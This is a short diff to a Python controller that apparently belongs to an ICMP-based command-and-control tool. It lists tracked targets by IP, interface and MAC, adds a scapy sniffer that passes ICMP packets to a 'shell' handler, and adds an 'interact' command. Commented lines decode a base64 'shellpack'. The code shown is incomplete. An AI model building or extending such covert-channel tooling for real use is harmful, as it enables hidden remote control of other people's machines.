@@ -26,7 +26,7 @@ class Controller(Host):
         Target = Query()
         targets = self.db.all()
         for target in targets:
-            response += f" - {target['id']}\n"
+            response += f" [*] {target['id']}\n"
             response += f" --> {target['ip']}\n"
             response += f" --> {target['iface']}\n"
             response += f" --> {target['mac']}\n"
@@ -36,8 +36,18 @@ class Controller(Host):
         
         return response
 
-    # def instruction(self):
-    #     print(f"Instruction Response:\n{base64.b64decode(shellpack['data'].decode()).decode()}")
+    def sniffer(self):
+        sniff(iface=self.interface, prn=shell, filter="icmp", store="0")
+
+    def interact(self, target):
+        Target = Query()
+        target = self.db.search(Target.id == target)
+        print(target)
+
+        # self.sniffing.start()
+        # print(f"Instruction Response:\n{base64.b64decode(shellpack['data'].decode()).decode()}")
+
+    
 
 if __name__ == "__main__":
     controller = Controller()
@@ -46,8 +56,9 @@ if __name__ == "__main__":
     match sys.argv[1]:
         case "ls":
             print(controller.list_hosts())
-        case "":
-            print(controller.list_hosts())
+        case "interact":
+            controller.interact(sys.argv[2])
+
             
     
     
